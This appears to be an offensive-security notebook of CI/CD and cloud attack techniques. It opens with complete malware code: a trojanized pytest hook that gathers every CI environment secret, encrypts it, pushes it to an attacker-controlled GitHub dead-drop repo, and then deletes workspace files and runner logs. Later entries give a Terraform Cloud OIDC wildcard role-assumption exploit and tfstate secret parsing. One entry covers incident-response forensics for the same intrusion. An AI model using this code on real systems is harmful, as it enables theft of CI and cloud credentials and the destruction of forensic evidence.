# CI/CD Pipeline Attack Techniques

### Trojanized Pytest Plugin → CI Runner Secret Exfiltration (Supply Chain) [added: 2026-05]
- **Tags:** #SupplyChain #CiCd #GitHubActions #Pytest #EnvVarExfil #Python #FernetEncryption #DeadDrop #SelfHostedRunner #PytestHook #XORObfuscation
- **Trigger:** Target uses self-hosted GitHub Actions runners with Python/pytest in CI; runner has persistent package installation (not ephemeral); self-hosted runner directory (`actions-runner/`) confirmed; CI workflow runs on schedule or push
- **Prereq:** Ability to install/modify a Python package on the CI runner (e.g., trojanize a package distributed via PyPI or internal package index); pytest used in CI workflow; runner is self-hosted (persists packages across runs)
- **Yields:** All environment variables from every test run (GITHUB_TOKEN, KUBECONFIG, GOOGLE_APPLICATION_CREDENTIALS, AWS credentials, custom secrets injected via workflow); exfiltrated as encrypted blobs to a public GitHub dead-drop repo; persists indefinitely across CI runs
- **Opsec:** Med (outbound HTTPS to github.com API appears normal; Worker log deletion covers execution traces; only the malicious file in site-packages persists)
- **Context:** Pytest auto-loads any file in `_pytest/` that defines `pytest_*` hooks — no configuration required. Placing a malicious `veryveryverymalicious.py` inside a trojanized pytest package causes `pytest_sessionfinish` to fire after every test session with root access to the runner's environment. XOR-obfuscate sensitive strings (key=17: `chr(x ^ 17)`) to evade simple grep-based detection. Exfiltrate via GitHub Contents API using a hardcoded PAT; use Fernet symmetric encryption so blobs are unreadable without the key. Delete `$GITHUB_WORKSPACE` contents and `_diag/Worker_*` logs for anti-forensics. On a fleet of 240 runners, this yields every CI secret across all repos served.
- **Payload/Method:**
```python
# Malicious file: <trojanized_package>/_pytest/malicious_hook.py
# Place in site-packages/_pytest/ to auto-load as pytest plugin

def _s(data, k=17):
    return "".join(chr(x ^ k) for x in data)  # XOR deobfuscation

import os, json, base64, requests, shutil, importlib

# Obfuscated: from cryptography.fernet import Fernet
CRYPT_KEY = b"<base64-fernet-key>"
GITHUB_PAT = "<personal-access-token>"
REPO_OWNER = "<attacker-account>"
REPO_NAME  = "<dead-drop-repo>"
BRANCH     = "main"

runner = os.environ.get("RUNNER_NAME", "unknown")
ARTIFACT_PATH = f"{runner}.secret"

def collect_data():
    return {"environment_variables": dict(os.environ)}

def encrypt_data(data):
    from cryptography.fernet import Fernet
    return Fernet(CRYPT_KEY).encrypt(json.dumps(data).encode())

def get_sha(url, headers):
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
        return r.json().get("sha")
    return None

def upload_to_repo(blob):
    api_url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/data/{ARTIFACT_PATH}"
    headers = {"Authorization": f"token {GITHUB_PAT}", "Accept": "application/vnd.github+json"}
    payload = {"message": "update runtime data",
               "content": base64.b64encode(blob).decode(), "branch": BRANCH}
    sha = get_sha(api_url, headers)
    if sha:
        payload["sha"] = sha
    requests.put(api_url, headers=headers, json=payload).raise_for_status()

def pytest_sessionfinish(session, exitstatus):
    upload_to_repo(encrypt_data(collect_data()))
    # Anti-forensics
    os.chdir("/")
    workspace = os.environ.get("GITHUB_WORKSPACE", "")
    diag = os.path.abspath(os.path.join(workspace, "../../../_diag"))
    if workspace and os.path.exists(workspace):
        for name in os.listdir(workspace):
            p = os.path.join(workspace, name)
            shutil.rmtree(p, ignore_errors=True) if os.path.isdir(p) else os.remove(p)
    if os.path.exists(diag):
        for name in os.listdir(diag):
            if name.startswith("Worker_"):
                os.remove(os.path.join(diag, name))
```

---

### CI Runner Supply Chain IR Forensics [added: 2026-05]
- **Tags:** #IncidentResponse #SupplyChain #CiCd #GitHubActions #SitePackages #Fernet #FernetDecrypt #SparseClone #AntiForesics #PytestForensics #DeadDropDecrypt
- **Trigger:** Compromised CI runner with empty workspace and missing Worker logs; hostname matches CI runner pattern; attacker's GitHub repo contains Fernet-encrypted `.secret` files beginning with `gAAAAAB`; `actions-runner/` directory present in `/home/ubuntu/`
- **Prereq:** Shell on the compromised runner (or artifacts from it); attacker's dead-drop repo URL known; malicious Python package still present in user site-packages
- **Yields:** Recovery of Fernet key and GitHub PAT from XOR-obfuscated malicious payload; decrypted env vars from all compromised runners including GITHUB_TOKEN, KUBECONFIG, GCP/AWS credentials
- **Opsec:** Low (read-only investigation; sparse clone, python decryption only)
- **Context:** Empty workspace + no Worker_* logs = active anti-forensic cleanup, not a logging gap. Hunt the malicious package in user-installed site-packages (not system packages). Grep for exfil repo name, attacker account, or GitHub API strings. Recover XOR key from `_s()` helper, decode all obfuscated arrays, extract Fernet key. Use sparse clone to pull only `data/` from dead-drop repo without full history. Fernet `gAAAAAB` prefix = version byte 0x80 + timestamp + IV + AES-128-CBC ciphertext + HMAC-SHA256.
- **Payload/Method:**
```bash
# Step 1: Identify compromised machine purpose
cat /home/ubuntu/actions-runner/.runner  # → gitHubUrl, workFolder

# Step 2: Confirm anti-forensics indicators
ls /home/ubuntu/actions-runner/_work/     # empty → workspace wiped
find /home/ubuntu/actions-runner/_diag/ -name "Worker*"  # no results → logs deleted

# Step 3: Hunt malicious package in user site-packages
grep -rl "stolen-repo-name\|attacker-account\|github\.com/.*push\|git push" \
  /home/ubuntu/.local/lib/python3.*/site-packages/ 2>/dev/null | grep -v __pycache__
# → finds _pytest/veryveryverymalicious.py or similar

grep -rl "GITHUB_TOKEN\|encrypt\|Fernet" \
  /home/ubuntu/.local/lib/python3.*/site-packages/ 2>/dev/null | grep -v __pycache__ | grep -v -E "google|pip|requests/"

# Step 4: Extract XOR-obfuscated strings from malicious file
python3 << 'EOF'
def _s(data, k=17):
    return "".join(chr(x ^ k) for x in data)
# Paste the integer arrays from the malicious file:
print("Key:", _s([<CRYPT_KEY_ARRAY>]))
print("PAT:", _s([<GITHUB_PAT_ARRAY>]))
print("Owner:", _s([<REPO_OWNER_ARRAY>]))
print("Repo:", _s([<REPO_NAME_ARRAY>]))
EOF

# Step 5: Sparse-clone dead-drop repo (avoids full 500-commit history)
cd /tmp
git clone --depth 1 --filter=blob:none --sparse \
  https://github.com/<attacker>/<dead-drop-repo>.git
cd <dead-drop-repo>
git sparse-checkout set data
ls data/ | grep <runner-hostname>  # → <runner-name>.secret

# Step 6: Decrypt all exfiltrated blobs
python3 << 'EOF'
from cryptography.fernet import Fernet
import json, os
key = b"<recovered-fernet-key>"
f = Fernet(key)
data_dir = "data"
for filename in sorted(os.listdir(data_dir)):
    if not filename.endswith(".secret"):
        continue
    try:
        decrypted = f.decrypt(open(os.path.join(data_dir, filename), "rb").read())
        env = json.loads(decrypted).get("environment_variables", {})
        print(f"\n=== {filename} ===")
        for k, v in sorted(env.items()):
            if any(x in k.lower() for x in ["token", "key", "secret", "cred", "flag", "pass"]):
                print(f"  *** {k} = {v}")
    except Exception as e:
        print(f"{filename}: FAILED - {e}")
EOF
```

### Terraform State File (tfstate) Sensitive Data Disclosure [added: 2026-05]
- **Tags:** #AWS #Terraform #tfstate #IaC #SecretLeak #StateLeak #IAMEnum #TrustPolicy
- **Trigger:** `.tfstate` file found in S3 bucket, GitHub/GitLab repo, CTF artifact, or public storage; JSON with `"version": 4` and `"resources"` array
- **Prereq:** Read access to tfstate file (S3 `s3:GetObject`, VCS leak, or provided directly)
- **Yields:** IAM policy documents, role ARNs, trust policies, attached policy ARNs, resource names, OIDC provider URLs, and sometimes plaintext access keys
- **Opsec:** Low — read-only; no API calls against target AWS account required
- **Context:** Terraform stores all infrastructure state as plaintext JSON; every IAM policy, trust condition, bucket name, and OIDC provider is fully readable without AWS credentials. Scan for `assume_role_policy`, `policy_document`, `oidc_provider`, and `StringLike` conditions with wildcards — these reveal assumable roles.
- **Payload/Method:**
```bash
# Parse key fields from tfstate
cat terraform.tfstate | python3 -c "
import json, sys
state = json.load(sys.stdin)
for r in state.get('resources', []):
    for inst in r.get('instances', []):
        attrs = inst.get('attributes', {})
        for k in ['assume_role_policy','inline_policy','policy','arn','name']:
            if k in attrs and attrs[k]:
                print(f'[{r[\"type\"]}] {k}: {attrs[k][:300]}')
"
# Look for: StringLike wildcards in assume_role_policy → assumable OIDC roles
# Look for: iam:CreateUser / iam:AttachUserPolicy in inline policies → priv esc paths
```

### Terraform Cloud OIDC Wildcard Trust Policy AssumeRole [added: 2026-05]
- **Tags:** #AWS #Terraform #OIDC #AssumeRole #TrustPolicy #Wildcard #Federation #WebIdentity #IAMFederation
- **Trigger:** IAM role trust policy uses `StringLike` with wildcard on `app.terraform.io:sub` (e.g., `organization:cloud-village-*:workspace:<name>:*`); attacker can create a free Terraform Cloud org
- **Prereq:** Trust policy has wildcard org name condition; OIDC provider is `arn:aws:iam::ACCT:oidc-provider/app.terraform.io`; Terraform Cloud account (free to create)
- **Yields:** STS credentials for the targeted IAM role with all attached permissions
- **Opsec:** Low — legitimate `AssumeRoleWithWebIdentity` call; indistinguishable from valid Terraform pipeline in CloudTrail
- **Context:** If the trust condition uses `StringLike` with a wildcard org prefix (e.g., `cloud-village-*`) instead of an exact org name, any Terraform Cloud org matching that prefix can assume the role. Create a matching org (cloud-village-attacker), create the required workspace, and use Terraform dynamic credentials OIDC flow to claim the role.
- **Payload/Method:**
```hcl
# main.tf — run from a Terraform Cloud workspace matching the wildcard org
terraform {
  required_providers {
    aws = { source = "hashicorp/aws", version = "~> 4.49.0" }
  }
  cloud {
    organization = "cloud-village-attacker"   # matches cloud-village-* wildcard
    workspaces { name = "dc-33-cv-tf" }       # must match exact workspace name in condition
  }
}
provider "aws" { region = "us-west-2" }

# Environment variables needed in Terraform Cloud workspace:
# TFC_AWS_PROVIDER_AUTH = true
# TFC_AWS_RUN_ROLE_ARN  = arn:aws:iam::ACCT_ID:role/TerraformCloudDC33Role
```
```bash
# After terraform apply, extract outputs:
terraform output access_key_id
terraform output -raw secret_access_key

# Then use for AWS API calls:
AWS_ACCESS_KEY_ID=<id> AWS_SECRET_ACCESS_KEY=<secret> aws s3 cp s3://bucket/flag.txt -
```
